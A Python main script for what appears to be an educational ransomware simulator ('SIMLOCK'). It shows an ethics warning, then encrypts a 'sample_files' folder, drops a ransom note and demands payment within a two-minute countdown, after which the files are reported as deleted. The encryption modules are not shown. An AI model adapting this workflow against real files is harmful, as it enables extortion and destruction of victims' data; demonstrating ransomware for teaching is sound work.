from ethics import show_ethics_warning
from key_manager import generate_key
from encryptor import encrypt_files
from decryptor import decrypt_files
from ransom_note import drop_note
from time_lock import countdown_with_user_check

def print_banner():
    banner = r"""
            ███████╗██╗███╗   ███╗██╗      ██████╗  ██████╗██╗  ██╗
            ██╔════╝██║████╗ ████║██║     ██╔═══██╗██╔════╝██║ ██╔╝
            ███████╗██║██╔████╔██║██║     ██║   ██║██║     █████╔╝ 
            ╚════██║██║██║╚██╔╝██║██║     ██║   ██║██║     ██╔═██╗ 
            ███████║██║██║ ╚═╝ ██║███████╗╚██████╔╝╚██████╗██║  ██╗
            ╚══════╝╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
"""
    print(banner)

def payment_status():
    return input("Have you made the payment? Type 'YES' to proceed: ").strip() == 'YES'

def main():
    print_banner()

    show_ethics_warning()

    folder = "sample_files"
    generate_key()
    encrypt_files(folder)
    drop_note(folder)

    print("\nYou have 2 minutes to make the payment and type 'YES'.")
    print("Waiting for input during countdown...")

    success = countdown_with_user_check(folder, delay_seconds=120)
    if success:
        decrypt_files(folder)
    else:
        print("💣 Time expired. Files were deleted.")

if __name__ == "__main__":
    main()
